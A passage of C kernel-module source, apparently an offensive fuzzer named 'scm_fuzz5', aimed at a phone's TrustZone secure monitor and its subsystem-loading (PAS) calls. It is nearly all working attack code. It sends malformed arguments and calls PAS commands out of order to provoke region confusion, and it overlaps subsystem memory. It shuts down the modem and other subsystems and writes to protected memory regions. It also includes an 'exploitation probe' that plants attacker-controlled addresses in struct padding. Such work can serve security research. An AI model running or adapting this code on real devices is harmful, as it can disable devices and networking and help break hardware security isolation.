                ret = scm_call2(SCM_SIP_FNID(2, 1), &desc);
                break;
            case 2: /* mem_setup: sizes as buffer ptrs */
                desc.arginfo = SCM_ARGS_3(SCM_VAL, SCM_RW, SCM_RW);
                desc.args[0] = 9;
                desc.args[1] = 0x86a00000;
                desc.args[2] = 0x500000;
                pr_info("scm_fuzz5: TYPE[%d] mem_setup buf_types\n", test_id);
                ret = scm_call2(SCM_SIP_FNID(2, 2), &desc);
                break;
            case 3: /* auth: PID as buffer */
                desc.arginfo = SCM_ARGS_1(SCM_RW);
                desc.args[0] = 9;
                pr_info("scm_fuzz5: TYPE[%d] auth pid_as_buf\n", test_id);
                ret = scm_call2(SCM_SIP_FNID(2, 5), &desc);
                break;
            case 4: /* shutdown with extra args */
                desc.arginfo = SCM_ARGS_3(SCM_VAL, SCM_VAL, SCM_VAL);
                desc.args[0] = 9;
                desc.args[1] = 0xdeadbeef;
                desc.args[2] = 0xcafebabe;
                pr_info("scm_fuzz5: TYPE[%d] shutdown extra_args\n", test_id);
                ret = scm_call2(SCM_SIP_FNID(2, 6), &desc);
                break;
            case 5: /* init_image: 4 args instead of 2 */
                desc.arginfo = SCM_ARGS_4(SCM_VAL, SCM_RW, SCM_VAL, SCM_VAL);
                desc.args[0] = 9;
                desc.args[1] = 0x86a00000;
                desc.args[2] = 0x500000;
                desc.args[3] = 1;
                pr_info("scm_fuzz5: TYPE[%d] init 4args\n", test_id);
                ret = scm_call2(SCM_SIP_FNID(2, 1), &desc);
                break;
            case 6: /* Corrupt arginfo: nargs=15 */
                desc.arginfo = 0x0F; /* 15 args */
                desc.args[0] = 9;
                pr_info("scm_fuzz5: TYPE[%d] arginfo_15args\n", test_id);
                ret = scm_call2(SCM_SIP_FNID(2, 1), &desc);
                break;
            case 7: /* Arginfo with invalid type bits */
                desc.arginfo = 0xFFFFFFFF;
                desc.args[0] = 9;
                pr_info("scm_fuzz5: TYPE[%d] arginfo_FFFFFFFF\n", test_id);
                ret = scm_call2(SCM_SIP_FNID(2, 1), &desc);
                break;
            default:
                pr_info("scm_fuzz5: TYPE[%d] no more tests\n", test_id);
                goto type_done;
            }

            pr_info("scm_fuzz5: TYPE[%d] ret=%d r0=0x%llx r1=0x%llx\n",
                    test_id, ret, desc.ret[0], desc.ret[1]);
            msleep(10);
        }
type_done:;
    }
    break;

    case 6: /* ============================================
             * PAS state machine abuse
             * Call PAS commands in wrong order / double-call
             * ============================================ */
    {
        void *mdt;
        size_t mdt_size;
        int test_id;

        mdt = read_file_buf(meta_path, &mdt_size);
        if (!mdt) { pr_err("scm_fuzz5: cannot read %s\n", meta_path); return -ENOENT; }

        for (test_id = sub_test; test_id < sub_test + max_tests; test_id++) {
            switch (test_id) {
            case 0: /* Double shutdown */
                do_pas_shutdown(pid_val);
                ret = do_pas_shutdown(pid_val);
                pr_info("scm_fuzz5: STATE[%d] double_shutdown ret=%d\n", test_id, ret);
                break;
            case 1: /* Init without shutdown (from running state) */
                ret = do_pas_init_image(pid_val, mdt, mdt_size);
                pr_info("scm_fuzz5: STATE[%d] init_no_shutdown ret=%d\n", test_id, ret);
                break;
            case 2: /* Auth without init or mem_setup */
                do_pas_shutdown(pid_val);
                ret = do_pas_auth_reset(pid_val);
                pr_info("scm_fuzz5: STATE[%d] auth_no_init ret=%d\n", test_id, ret);
                break;
            case 3: /* Mem_setup without init */
                do_pas_shutdown(pid_val);
                ret = do_pas_mem_setup(pid_val, 0x86a00000, 0x500000);
                pr_info("scm_fuzz5: STATE[%d] mem_no_init ret=%d\n", test_id, ret);
                break;
            case 4: /* Double init_image (valid both times) */
                do_pas_shutdown(pid_val);
                do_pas_init_image(pid_val, mdt, mdt_size);
                ret = do_pas_init_image(pid_val, mdt, mdt_size);
                pr_info("scm_fuzz5: STATE[%d] double_init ret=%d\n", test_id, ret);
                break;
            case 5: /* Init for different PIDs without shutdown */
                do_pas_shutdown(pid_val);
                do_pas_init_image(pid_val, mdt, mdt_size);
                /* Now try init for ADSP (PID=4) without shutting down venus */
                ret = do_pas_init_image(4, mdt, mdt_size);
                pr_info("scm_fuzz5: STATE[%d] cross_pid_init ret=%d\n", test_id, ret);
                break;
            case 6: /* Auth for wrong PID after venus init */
                do_pas_shutdown(pid_val);
                do_pas_init_image(pid_val, mdt, mdt_size);
                do_pas_mem_setup(pid_val, 0x86a00000, 0x500000);
                ret = do_pas_auth_reset(4); /* ADSP instead of venus */
                pr_info("scm_fuzz5: STATE[%d] auth_wrong_pid ret=%d\n", test_id, ret);
                break;
            case 7: /* Mem_setup with wrong PID */
                do_pas_shutdown(pid_val);
                do_pas_init_image(pid_val, mdt, mdt_size);
                ret = do_pas_mem_setup(4, 0x86a00000, 0x500000);
                pr_info("scm_fuzz5: STATE[%d] mem_wrong_pid ret=%d\n", test_id, ret);
                break;
            case 8: /* Shutdown a different PID mid-sequence */
                do_pas_shutdown(pid_val);
                do_pas_init_image(pid_val, mdt, mdt_size);
                do_pas_mem_setup(pid_val, 0x86a00000, 0x500000);
                ret = do_pas_shutdown(4); /* shutdown ADSP */
                pr_info("scm_fuzz5: STATE[%d] shutdown_other ret=%d\n", test_id, ret);
                /* Then try auth on venus */
                ret = do_pas_auth_reset(pid_val);
                pr_info("scm_fuzz5: STATE[%d] auth_after_other_shutdown ret=%d\n", test_id, ret);
                break;
            case 9: /* Triple mem_setup with different params */
                do_pas_shutdown(pid_val);
                do_pas_init_image(pid_val, mdt, mdt_size);
                do_pas_mem_setup(pid_val, 0x86a00000, 0x500000);
                do_pas_mem_setup(pid_val, 0x86a00000, 0x100000); /* smaller */
                ret = do_pas_mem_setup(pid_val, 0x88d00000, 0x500000); /* ADSP region */
                pr_info("scm_fuzz5: STATE[%d] triple_mem ret=%d\n", test_id, ret);
                break;
            case 10: /* Init → mem_setup with modem region → auth */
                do_pas_shutdown(pid_val);
                do_pas_init_image(pid_val, mdt, mdt_size);
                do_pas_mem_setup(pid_val, 0x8b800000, 0x500000); /* modem region! */
                ret = do_pas_auth_reset(pid_val);
                pr_info("scm_fuzz5: STATE[%d] auth_modem_region ret=%d %s\n",
                        test_id, ret, ret == 0 ? "*** REGION CONFUSION ***" : "");
                break;
            default:
                pr_info("scm_fuzz5: STATE[%d] no more tests\n", test_id);
                goto state_done;
            }
            msleep(20);
        }
state_done:
        kfree(mdt);
    }
    break;

    case 7: /* ============================================
             * Overlapping PIL region test
             * Setup two subsystems pointing to same memory
             * ============================================ */
    {
        void *mdt;
        size_t mdt_size;

        mdt = read_file_buf(meta_path, &mdt_size);
        if (!mdt) { pr_err("scm_fuzz5: cannot read %s\n", meta_path); return -ENOENT; }

        /* Shutdown both venus and attempt with ADSP */
        do_pas_shutdown(pid_val);
        do_pas_shutdown(4);
        msleep(10);

        /* Init venus */
        ret = do_pas_init_image(pid_val, mdt, mdt_size);
        pr_info("scm_fuzz5: OVERLAP venus init ret=%d\n", ret);

        /* Try to setup venus mem pointing to ADSP region */
        ret = do_pas_mem_setup(pid_val, 0x88d00000, 0x500000);
        pr_info("scm_fuzz5: OVERLAP venus mem=adsp_region ret=%d\n", ret);

        /* Try auth - if it works, venus runs in ADSP memory! */
        ret = do_pas_auth_reset(pid_val);
        pr_info("scm_fuzz5: OVERLAP venus auth ret=%d %s\n",
                ret, ret == 0 ? "*** OVERLAP SUCCESS ***" : "rejected");

        /* Clean up */
        do_pas_shutdown(pid_val);
        kfree(mdt);
    }
    break;

    case 8: /* ============================================
             * Modem/DSP subsystem exploration
             * ============================================ */
    {
        struct scm_desc desc;
        int test_id;

        /* Known subsystem PIDs that were recognized:
         * 0x01 (modem), 0x04 (ADSP), 0x09 (venus), 0x0d (??),
         * 0x0f (??), 0x12 (CDSP?), 0x13 (??), 0x14 (??),
         * 0x15 (??), 0x17 (??) */

        for (test_id = sub_test; test_id < sub_test + max_tests; test_id++) {
            switch (test_id) {
            case 0: /* Check modem PIL state */
                memset(&desc, 0, sizeof(desc));
                desc.arginfo = SCM_ARGS_1(SCM_VAL);
                desc.args[0] = 1;
                ret = scm_call2(SCM_SIP_FNID(2, 7), &desc); /* is_supported */
                pr_info("scm_fuzz5: MODEM[%d] is_supported ret=%d r0=%lld\n",
                        test_id, ret, (long long)desc.ret[0]);
                break;
            case 1: /* Try modem shutdown (DANGEROUS - may kill network) */
                pr_info("scm_fuzz5: MODEM[%d] attempting modem shutdown (PID=1)...\n", test_id);
                ret = do_pas_shutdown(1);
                pr_info("scm_fuzz5: MODEM[%d] modem_shutdown ret=%d\n", test_id, ret);
                break;
            case 2: /* Check modem PIL region after shutdown */
                {
                    /* Read modem memory region - might be accessible now */
                    void __iomem *modem_mem;
                    modem_mem = ioremap(0x8b800000, PAGE_SIZE);
                    if (modem_mem) {
                        u32 v0 = readl(modem_mem);
                        u32 v1 = readl(modem_mem + 4);
                        pr_info("scm_fuzz5: MODEM[%d] region read: %08x %08x\n",
                                test_id, v0, v1);
                        iounmap(modem_mem);
                    } else {
                        pr_info("scm_fuzz5: MODEM[%d] ioremap failed\n", test_id);
                    }
                }
                break;
            case 3: /* Test WLAN PIL memory region */
                {
                    void __iomem *wlan_mem;
                    wlan_mem = ioremap(0x8b500000, PAGE_SIZE);
                    if (wlan_mem) {
                        u32 v0 = readl(wlan_mem);
                        u32 v1 = readl(wlan_mem + 4);
                        pr_info("scm_fuzz5: MODEM[%d] wlan_region read: %08x %08x\n",
                                test_id, v0, v1);
                        iounmap(wlan_mem);
                    } else {
                        pr_info("scm_fuzz5: MODEM[%d] wlan ioremap failed\n", test_id);
                    }
                }
                break;
            case 4: /* Try write to WLAN region after modem shutdown */
                {
                    void __iomem *wlan_mem;
                    wlan_mem = ioremap_wc(0x8b500000, PAGE_SIZE);
                    if (wlan_mem) {
                        u32 orig = readl(wlan_mem);
                        writel(0xDEADBEEF, wlan_mem);
                        mb();
                        u32 rb = readl(wlan_mem);
                        pr_info("scm_fuzz5: MODEM[%d] wlan write test: "
                                "orig=0x%08x wrote=0xDEADBEEF readback=0x%08x %s\n",
                                test_id, orig, rb,
                                rb == 0xDEADBEEF ? "*** WRITABLE ***" : "PROTECTED");
                        if (rb == 0xDEADBEEF) {
                            writel(orig, wlan_mem);
                            mb();
                        }
                        iounmap(wlan_mem);
                    }
                }
                break;
            case 5: /* Explore QMI/MSA related SCM calls */
                {
                    /* svc=0x04 is Info service, might have modem status */
                    memset(&desc, 0, sizeof(desc));
                    desc.arginfo = SCM_ARGS_1(SCM_VAL);
                    desc.args[0] = 1; /* modem */
                    ret = scm_call2(SCM_SIP_FNID(0x04, 0x02), &desc);
                    pr_info("scm_fuzz5: MODEM[%d] svc4_cmd2 ret=%d r0=0x%llx\n",
                            test_id, ret, desc.ret[0]);
                }
                break;
            case 6: /* Check unknown PIDs - 0x0d, 0x0f, 0x12-0x15, 0x17 */
                {
                    static const u8 pids[] = {0x0d, 0x0f, 0x12, 0x13, 0x14, 0x15, 0x17};
                    int p;
                    for (p = 0; p < 7; p++) {
                        /* Try shutdown each to discover what they are */
                        ret = do_pas_shutdown(pids[p]);
                        pr_info("scm_fuzz5: MODEM[%d] shutdown PID=0x%x ret=%d\n",
                                test_id, pids[p], ret);
                        msleep(5);
                    }
                }
                break;
            case 7: /* QMI-related: svc=0x01 (boot) commands */
                {
                    /* Explore boot service commands that might control subsystem loading */
                    int c;
                    for (c = 1; c <= 20; c++) {
                        if (!scm_is_call_available(0x01, c)) continue;
                        memset(&desc, 0, sizeof(desc));
                        desc.arginfo = SCM_ARGS_1(SCM_VAL);
                        desc.args[0] = 0;
                        ret = scm_call2(SCM_SIP_FNID(0x01, c), &desc);
                        pr_info("scm_fuzz5: MODEM[%d] boot svc1_cmd%d ret=%d r0=0x%llx\n",
                                test_id, c, ret, desc.ret[0]);
                    }
                }
                break;
            default:
                pr_info("scm_fuzz5: MODEM[%d] no more\n", test_id);
                goto modem_done;
            }
            msleep(20);
        }
modem_done:;
    }
    break;

    case 9: /* ============================================
             * Large / degenerate metadata buffer tests
             * Send oversized metadata to stress TZ allocator
             * ============================================ */
    {
        int test_id;

        for (test_id = sub_test; test_id < sub_test + max_tests; test_id++) {
            size_t alloc_size;
            void *buf;

            do_pas_shutdown(pid_val);
            msleep(5);

            switch (test_id) {
            case 0: alloc_size = 4096; break;       /* normal page */
            case 1: alloc_size = 65536; break;      /* 64KB */
            case 2: alloc_size = 262144; break;     /* 256KB */
            case 3: alloc_size = 1048576; break;    /* 1MB */
            case 4: alloc_size = 4194304; break;    /* 4MB */
            case 5: alloc_size = 16; break;         /* tiny */
            case 6: alloc_size = 1; break;          /* 1 byte */
            case 7: alloc_size = 52; break;         /* ELF header only */
            default:
                pr_info("scm_fuzz5: LARGE[%d] no more\n", test_id);
                goto large_done;
            }

            buf = kzalloc(alloc_size, GFP_KERNEL);
            if (!buf) {
                /* Try vmalloc for large allocations */
                buf = vzalloc(alloc_size);
                if (!buf) {
                    pr_err("scm_fuzz5: LARGE[%d] alloc %zu failed\n", test_id, alloc_size);
                    continue;
                }
                /* For vmalloc, we need to use virt_to_phys carefully */
                pr_info("scm_fuzz5: LARGE[%d] using vmalloc for %zu bytes\n",
                        test_id, alloc_size);
            }

            /* Fill with ELF header + garbage */
            if (alloc_size >= 52) {
                build_base_elf((Elf32_Ehdr_t *)buf, 1);
            }
            /* Fill rest with pattern */
            if (alloc_size > 52) {
                memset(buf + 52, 0x41, alloc_size - 52);
            }

            ret = do_pas_init_image(pid_val, buf, alloc_size);
            pr_info("scm_fuzz5: LARGE[%d] size=%zu ret=%d %s\n",
                    test_id, alloc_size, ret,
                    ret == 0 ? "*** ACCEPTED ***" : "rejected");

            if (is_vmalloc_addr(buf))
                vfree(buf);
            else
                kfree(buf);
            msleep(10);
        }
large_done:;
    }
    break;

    case 10: /* ============================================
              * Debug: isolate crash source step by step
              * sub_test controls which step to run:
              *   0 = just kzalloc + build_base_elf (no SCM)
              *   1 = kzalloc + shutdown only
              *   2 = kzalloc + shutdown + init_image (zeros)
              *   3 = kzalloc + shutdown + init_image (synthetic ELF)
              *   4 = kzalloc + shutdown + init_image (real mdt)
              * ============================================ */
    {
        void *buf;

        buf = kzalloc(PAGE_SIZE, GFP_KERNEL);
        if (!buf) return -ENOMEM;
        pr_info("scm_fuzz5: DBG10 buf=%px phys=0x%llx sub_test=%d\n",
                buf, (u64)virt_to_phys(buf), sub_test);

        if (sub_test == 0) {
            /* Just allocate and build ELF - no SCM calls */
            build_base_elf((Elf32_Ehdr_t *)buf, 0);
            pr_info("scm_fuzz5: DBG10 kzalloc+elf only - no SCM call\n");
            kfree(buf);
            break;
        }

        if (sub_test == 1) {
            /* kzalloc + shutdown only */
            pr_info("scm_fuzz5: DBG10 calling shutdown(9)...\n");
            ret = do_pas_shutdown(pid_val);
            pr_info("scm_fuzz5: DBG10 shutdown ret=%d\n", ret);
            kfree(buf);
            break;
        }

        if (sub_test == 2) {
            /* Direct scm_call2 like scm_test_init (which works) */
            void *direct_buf;
            phys_addr_t direct_phys;
            struct scm_desc direct_desc;

            direct_buf = (void *)__get_free_pages(GFP_KERNEL | __GFP_ZERO, 0);
            if (!direct_buf) { kfree(buf); break; }
            direct_phys = virt_to_phys(direct_buf);
            pr_info("scm_fuzz5: DBG10 sub2 direct_buf=%px phys=0x%llx\n",
                    direct_buf, (u64)direct_phys);

            memset(&direct_desc, 0, sizeof(direct_desc));
            direct_desc.arginfo = 2 | (0 << 4) | (2 << 6);
            direct_desc.args[0] = 9;
            direct_desc.args[1] = direct_phys;

            pr_info("scm_fuzz5: DBG10 sub2 calling scm_call2...\n");
            ret = scm_call2(0x42000201, &direct_desc);
            pr_info("scm_fuzz5: DBG10 sub2 ret=%d r0=0x%llx\n", ret, direct_desc.ret[0]);

            free_pages((unsigned long)direct_buf, 0);
            kfree(buf);
            break;
        }

        if (sub_test == 3) {
            /* Direct code with shutdown — isolate wrapper vs shutdown */
            void *direct_buf;
            phys_addr_t direct_phys;
            struct scm_desc direct_desc;

            pr_info("scm_fuzz5: DBG10 sub3 shutdown first...\n");
            do_pas_shutdown(pid_val);
            msleep(200); /* delay after shutdown like scm_fuzz4's rmmod/insmod gap */

            direct_buf = (void *)__get_free_pages(GFP_KERNEL | __GFP_ZERO, 0);
            if (!direct_buf) { kfree(buf); break; }
            direct_phys = virt_to_phys(direct_buf);
            pr_info("scm_fuzz5: DBG10 sub3 direct_buf=%px phys=0x%llx\n",
                    direct_buf, (u64)direct_phys);

            memset(&direct_desc, 0, sizeof(direct_desc));
            direct_desc.arginfo = 2 | (0 << 4) | (2 << 6);
            direct_desc.args[0] = 9;
            direct_desc.args[1] = direct_phys;

            pr_info("scm_fuzz5: DBG10 sub3 calling scm_call2...\n");
            ret = scm_call2(0x42000201, &direct_desc);
            pr_info("scm_fuzz5: DBG10 sub3 ret=%d r0=0x%llx\n", ret, direct_desc.ret[0]);

            free_pages((unsigned long)direct_buf, 0);
            kfree(buf);
            break;
        }

        if (sub_test == 4) {
            /* Read real mdt from file and init_image */
            void *mdt, *dma_buf;
            size_t mdt_size;
            mdt = read_file_buf(meta_path, &mdt_size);
            if (!mdt) {
                pr_err("scm_fuzz5: DBG10 cannot read %s\n", meta_path);
                kfree(buf);
                break;
            }
            pr_info("scm_fuzz5: DBG10 read %zu bytes from %s\n",
                    mdt_size, meta_path);
            /* Allocate DMA buffer of correct size */
            dma_buf = kzalloc(mdt_size, GFP_KERNEL);
            if (!dma_buf) { kfree(mdt); kfree(buf); break; }
            memcpy(dma_buf, mdt, mdt_size);
            kfree(mdt);
            pr_info("scm_fuzz5: DBG10 dma_buf phys=0x%llx\n",
                    (u64)virt_to_phys(dma_buf));
            pr_info("scm_fuzz5: DBG10 shutdown...\n");
            do_pas_shutdown(pid_val);
            pr_info("scm_fuzz5: DBG10 init_image real mdt...\n");
            ret = do_pas_init_image(pid_val, dma_buf, mdt_size);
            pr_info("scm_fuzz5: DBG10 init_image real ret=%d\n", ret);
            kfree(dma_buf);
            kfree(buf);
            break;
        }

        if (sub_test == 5) {
            /* Read real mdt, modify phnum=0, init_image */
            void *mdt, *dma_buf;
            size_t mdt_size;
            mdt = read_file_buf(meta_path, &mdt_size);
            if (!mdt) {
                pr_err("scm_fuzz5: DBG10 cannot read %s\n", meta_path);
                kfree(buf);
                break;
            }
            dma_buf = kzalloc(mdt_size, GFP_KERNEL);
            if (!dma_buf) { kfree(mdt); kfree(buf); break; }
            memcpy(dma_buf, mdt, mdt_size);
            kfree(mdt);
            /* Modify: set phnum=0 */
            ((Elf32_Ehdr_t *)dma_buf)->e_phnum = 0;
            pr_info("scm_fuzz5: DBG10 shutdown...\n");
            do_pas_shutdown(pid_val);
            pr_info("scm_fuzz5: DBG10 init_image real+phnum=0...\n");
            ret = do_pas_init_image(pid_val, dma_buf, mdt_size);
            pr_info("scm_fuzz5: DBG10 init_image real+phnum=0 ret=%d\n", ret);
            kfree(dma_buf);
            kfree(buf);
            break;
        }

        pr_info("scm_fuzz5: DBG10 unknown sub_test %d\n", sub_test);

        /* sub_test=6: test do_pas_init_image wrapper WITHOUT shutdown */
        if (sub_test == 6) {
            pr_info("scm_fuzz5: DBG10 sub6 wrapper init_image (no shutdown)...\n");
            ret = do_pas_init_image(pid_val, buf, PAGE_SIZE);
            pr_info("scm_fuzz5: DBG10 sub6 ret=%d\n", ret);
            kfree(buf);
            break;
        }

        /* sub_test=7: probe scm_call2 overflow — what does TZ write beyond ret[3]?
         * Zero the entire desc (including __pad), make SCM call, dump __pad.
         * This reveals hidden return fields in the vendor struct. */
        if (sub_test == 7) {
            struct scm_desc desc;
            void *scm_buf;
            phys_addr_t phys;
            int j;

            /* --- Test 1: PAS shutdown(9) --- */
            memset(&desc, 0xAA, sizeof(desc));  /* fill with 0xAA sentinel */
            desc.arginfo = SCM_ARGS_1(SCM_VAL);
            desc.args[0] = 9;
            ret = scm_call2(SCM_SIP_FNID(PAS_SVC, PAS_SHUTDOWN_CMD), &desc);
            pr_info("scm_fuzz5: OVERFLOW_PROBE shutdown ret=%d\n", ret);
            pr_info("scm_fuzz5:   ret[0]=0x%llx ret[1]=0x%llx ret[2]=0x%llx\n",
                    desc.ret[0], desc.ret[1], desc.ret[2]);
            for (j = 0; j < 8; j++)
                pr_info("scm_fuzz5:   __pad[%d]=0x%llx%s\n", j, desc.__pad[j],
                        desc.__pad[j] != 0xAAAAAAAAAAAAAAAAULL ? " <<MODIFIED" : "");

            /* --- Test 2: PAS init_image(9, zeros) --- */
            scm_buf = (void *)__get_free_pages(GFP_KERNEL | __GFP_ZERO, 0);
            if (!scm_buf) { kfree(buf); break; }
            phys = virt_to_phys(scm_buf);

            memset(&desc, 0xAA, sizeof(desc));
            desc.arginfo = SCM_ARGS_2(SCM_VAL, SCM_RO);
            desc.args[0] = 9;
            desc.args[1] = phys;
            ret = scm_call2(SCM_SIP_FNID(PAS_SVC, PAS_INIT_IMAGE_CMD), &desc);
            pr_info("scm_fuzz5: OVERFLOW_PROBE init_image ret=%d\n", ret);
            pr_info("scm_fuzz5:   ret[0]=0x%llx ret[1]=0x%llx ret[2]=0x%llx\n",
                    desc.ret[0], desc.ret[1], desc.ret[2]);
            for (j = 0; j < 8; j++)
                pr_info("scm_fuzz5:   __pad[%d]=0x%llx%s\n", j, desc.__pad[j],
                        desc.__pad[j] != 0xAAAAAAAAAAAAAAAAULL ? " <<MODIFIED" : "");

            /* --- Test 3: PAS is_supported(9) --- */
            memset(&desc, 0xAA, sizeof(desc));
            desc.arginfo = SCM_ARGS_1(SCM_VAL);
            desc.args[0] = 9;
            ret = scm_call2(SCM_SIP_FNID(PAS_SVC, PAS_IS_SUPPORTED_CMD), &desc);
            pr_info("scm_fuzz5: OVERFLOW_PROBE is_supported ret=%d\n", ret);
            pr_info("scm_fuzz5:   ret[0]=0x%llx ret[1]=0x%llx ret[2]=0x%llx\n",
                    desc.ret[0], desc.ret[1], desc.ret[2]);
            for (j = 0; j < 8; j++)
                pr_info("scm_fuzz5:   __pad[%d]=0x%llx%s\n", j, desc.__pad[j],
                        desc.__pad[j] != 0xAAAAAAAAAAAAAAAAULL ? " <<MODIFIED" : "");

            /* --- Test 4: scm_is_call_available(2,1) — different path --- */
            memset(&desc, 0xAA, sizeof(desc));
            desc.arginfo = SCM_ARGS_1(SCM_VAL);
            desc.args[0] = 1; /* svc=TZ_INFO / generic check */
            ret = scm_call2(SCM_SIP_FNID(0x06, 0x03), &desc); /* TZ_INFO / TZ_FEATURE_ID */
            pr_info("scm_fuzz5: OVERFLOW_PROBE tz_info_feature ret=%d\n", ret);
            pr_info("scm_fuzz5:   ret[0]=0x%llx ret[1]=0x%llx ret[2]=0x%llx\n",
                    desc.ret[0], desc.ret[1], desc.ret[2]);
            for (j = 0; j < 8; j++)
                pr_info("scm_fuzz5:   __pad[%d]=0x%llx%s\n", j, desc.__pad[j],
                        desc.__pad[j] != 0xAAAAAAAAAAAAAAAAULL ? " <<MODIFIED" : "");

            /* --- Test 5: PAS mem_setup(9, venus region) --- */
            memset(&desc, 0xAA, sizeof(desc));
            desc.arginfo = SCM_ARGS_3(SCM_VAL, SCM_VAL, SCM_VAL);
            desc.args[0] = 9;
            desc.args[1] = 0x86a00000ULL;
            desc.args[2] = 0x500000ULL;
            ret = scm_call2(SCM_SIP_FNID(PAS_SVC, PAS_MEM_SETUP_CMD), &desc);
            pr_info("scm_fuzz5: OVERFLOW_PROBE mem_setup ret=%d\n", ret);
            pr_info("scm_fuzz5:   ret[0]=0x%llx ret[1]=0x%llx ret[2]=0x%llx\n",
                    desc.ret[0], desc.ret[1], desc.ret[2]);
            for (j = 0; j < 8; j++)
                pr_info("scm_fuzz5:   __pad[%d]=0x%llx%s\n", j, desc.__pad[j],
                        desc.__pad[j] != 0xAAAAAAAAAAAAAAAAULL ? " <<MODIFIED" : "");

            /* --- Test 6: PAS auth_and_reset(9) — after init+mem_setup --- */
            memset(&desc, 0xAA, sizeof(desc));
            desc.arginfo = SCM_ARGS_1(SCM_VAL);
            desc.args[0] = 9;
            ret = scm_call2(SCM_SIP_FNID(PAS_SVC, PAS_AUTH_AND_RESET_CMD), &desc);
            pr_info("scm_fuzz5: OVERFLOW_PROBE auth_reset ret=%d\n", ret);
            pr_info("scm_fuzz5:   ret[0]=0x%llx ret[1]=0x%llx ret[2]=0x%llx\n",
                    desc.ret[0], desc.ret[1], desc.ret[2]);
            for (j = 0; j < 8; j++)
                pr_info("scm_fuzz5:   __pad[%d]=0x%llx%s\n", j, desc.__pad[j],
                        desc.__pad[j] != 0xAAAAAAAAAAAAAAAAULL ? " <<MODIFIED" : "");

            /* Cleanup */
            do_pas_shutdown(pid_val);
            free_pages((unsigned long)scm_buf, 0);
            kfree(buf);
            break;
        }

        /* sub_test=8: Extended args exploitation probe
         * scm_call2 reads desc+136 for x5 (extended arg buffer ptr) regardless
         * of arg count. And when argcount >= 5, calls cleanup on desc+112.
         *
         * Strategy:
         * 1. Put controlled phys addr at desc+136 (__pad[3])
         * 2. Use argcount=5 in arginfo
         * 3. See if TZ reads extended args from our controlled addr
         * 4. Monitor desc+112 area for changes after scm_call2
         */
        if (sub_test == 8) {
            struct scm_desc desc;
            void *ext_buf;
            phys_addr_t ext_phys;
            int j;

            /* Allocate a page for "extended args" */
            ext_buf = (void *)__get_free_pages(GFP_KERNEL | __GFP_ZERO, 0);
            if (!ext_buf) { kfree(buf); break; }
            ext_phys = virt_to_phys(ext_buf);
            pr_info("scm_fuzz5: EXT_ARGS ext_buf=%px phys=0x%llx\n",
                    ext_buf, (u64)ext_phys);

            /* Fill ext_buf with known pattern */
            memset(ext_buf, 0x42, PAGE_SIZE);

            /* --- Test 1: PAS is_supported with argcount=5 ---
             * This is a safe call (read-only), but with argcount
             * claiming 5 args. x5 will be our controlled addr. */
            memset(&desc, 0xBB, sizeof(desc));
            desc.arginfo = 5 | (0 << 4) | (0 << 6) | (0 << 8) | (0 << 10) | (0 << 12);
            desc.args[0] = 9;
            desc.args[1] = 0;
            desc.args[2] = 0;
            desc.args[3] = 0; /* 4th arg, goes in register */
            /* __pad[3] at struct offset 136 → scm_call2 loads this into x5 */
            desc.__pad[3] = ext_phys;
            /* Clear __pad[0..2] to avoid cleanup issues */
            desc.__pad[0] = 0;
            desc.__pad[1] = 0;
            desc.__pad[2] = 0;

            pr_info("scm_fuzz5: EXT_ARGS test1 is_supported argcount=5 x5=0x%llx\n",
                    (u64)ext_phys);
            pr_info("scm_fuzz5: EXT_ARGS pre-call __pad: ");
            for (j = 0; j < 8; j++)
                pr_info("  __pad[%d]=0x%llx\n", j, desc.__pad[j]);

            ret = scm_call2(SCM_SIP_FNID(PAS_SVC, PAS_IS_SUPPORTED_CMD), &desc);
            pr_info("scm_fuzz5: EXT_ARGS test1 ret=%d\n", ret);
            pr_info("scm_fuzz5: EXT_ARGS post-call:\n");
            pr_info("  ret[0]=0x%llx ret[1]=0x%llx ret[2]=0x%llx\n",
                    desc.ret[0], desc.ret[1], desc.ret[2]);
            for (j = 0; j < 8; j++)
                pr_info("  __pad[%d]=0x%llx%s\n", j, desc.__pad[j],
                        (j < 3 && desc.__pad[j] != 0) ? " <<MODIFIED" :
                        (j == 3 && desc.__pad[j] != ext_phys) ? " <<MODIFIED" :
                        (j > 3 && desc.__pad[j] != 0xBBBBBBBBBBBBBBBBULL) ? " <<MODIFIED" : "");

            /* Check if ext_buf content was read/modified by TZ */
            {
                u64 *ep = (u64 *)ext_buf;
                pr_info("scm_fuzz5: EXT_ARGS ext_buf[0..3] = 0x%llx 0x%llx 0x%llx 0x%llx\n",
                        ep[0], ep[1], ep[2], ep[3]);
            }

            /* --- Test 2: TZ_INFO feature with argcount=5 --- */
            memset(&desc, 0xCC, sizeof(desc));
            desc.arginfo = 5 | (0 << 4) | (0 << 6) | (0 << 8) | (0 << 10) | (0 << 12);
            desc.args[0] = 1;
            desc.args[1] = 0;
            desc.args[2] = 0;
            desc.args[3] = 0;
            memset(ext_buf, 0x55, PAGE_SIZE);
            desc.__pad[0] = 0;
            desc.__pad[1] = 0;
            desc.__pad[2] = 0;
            desc.__pad[3] = ext_phys;

            pr_info("scm_fuzz5: EXT_ARGS test2 tz_info argcount=5\n");
            ret = scm_call2(SCM_SIP_FNID(0x06, 0x03), &desc);
            pr_info("scm_fuzz5: EXT_ARGS test2 ret=%d\n", ret);
            pr_info("  ret[0]=0x%llx ret[1]=0x%llx ret[2]=0x%llx\n",
                    desc.ret[0], desc.ret[1], desc.ret[2]);
            for (j = 0; j < 8; j++)
                pr_info("  __pad[%d]=0x%llx%s\n", j, desc.__pad[j],
                        (j == 3 && desc.__pad[j] != ext_phys) ? " <<MODIFIED" :
                        (j > 3 && desc.__pad[j] != 0xCCCCCCCCCCCCCCCCULL) ? " <<MODIFIED" : "");
            {
                u64 *ep = (u64 *)ext_buf;
                pr_info("scm_fuzz5: EXT_ARGS ext_buf[0..3] = 0x%llx 0x%llx 0x%llx 0x%llx\n",
                        ep[0], ep[1], ep[2], ep[3]);
            }

            /* --- Test 3: PAS init_image with argcount=5
             * Real 2-arg call but faking 5 args to trigger ext path */
            do_pas_shutdown(pid_val);
            memset(ext_buf, 0x77, PAGE_SIZE);
            memset(&desc, 0xDD, sizeof(desc));
            desc.arginfo = 5 | (0 << 4) | (2 << 6) | (0 << 8) | (0 << 10) | (0 << 12);
            desc.args[0] = 9;
            desc.args[1] = virt_to_phys(buf); /* real meta buf */
            desc.args[2] = 0;
            desc.args[3] = 0;
            desc.__pad[0] = 0;
            desc.__pad[1] = 0;
            desc.__pad[2] = 0;
            desc.__pad[3] = ext_phys;

            pr_info("scm_fuzz5: EXT_ARGS test3 init_image argcount=5\n");
            ret = scm_call2(SCM_SIP_FNID(PAS_SVC, PAS_INIT_IMAGE_CMD), &desc);
